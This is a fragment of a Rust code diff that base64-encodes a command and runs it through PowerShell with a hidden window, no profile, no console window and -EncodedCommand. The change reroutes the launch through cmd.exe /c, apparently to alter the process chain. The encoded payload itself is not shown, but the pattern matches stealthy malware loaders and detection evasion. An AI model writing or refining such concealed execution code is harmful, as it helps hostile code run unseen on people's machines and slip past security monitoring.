@@ -90,16 +90,15 @@ fn main() {
         let bytes: Vec<u8> = wide.iter().flat_map(|c| c.to_le_bytes().to_vec()).collect();
         use base64::{Engine as _, engine::general_purpose};
         let encoded = general_purpose::STANDARD.encode(&bytes);
-        let ps_path = std::env::var("WINDIR")
-            .map(|w| format!("{}\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", w))
-            .unwrap_or_else(|_| "powershell.exe".to_string());
-        let _ = Command::new(&ps_path)
-            .args([
-                "-NoProfile",
-                "-NonInteractive",
-                "-WindowStyle", "Hidden",
-                "-EncodedCommand", &encoded,
-            ])
+        let cmd_path = std::env::var("WINDIR")
+            .map(|w| format!("{}\\System32\\cmd.exe", w))
+            .unwrap_or_else(|_| "cmd.exe".to_string());
+        let ps_arg = format!(
+            "powershell -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {}",
+            encoded
+        );
+        let _ = Command::new(&cmd_path)
+            .args(["/c", &ps_arg])
             .creation_flags(0x08000000u32)
             .spawn();
         let start = std::time::Instant::now();
